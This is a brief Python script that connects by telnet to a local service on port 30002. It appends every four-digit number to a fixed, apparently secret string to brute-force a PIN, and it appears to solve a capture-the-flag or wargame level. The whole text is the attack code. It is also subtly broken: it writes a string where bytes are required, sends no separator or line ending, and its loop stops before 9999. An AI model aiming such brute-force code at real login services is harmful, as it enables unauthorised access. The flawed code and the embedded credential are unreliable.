from telnetlib import Telnet

command = "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"

with Telnet('localhost', 30002) as tn:
    for i in range(0, 9999):
        tn.write((command + str(i).zfill(4)))
        response = tn.read_until(b'\r\n')
        print(response.decode('ASCII'))
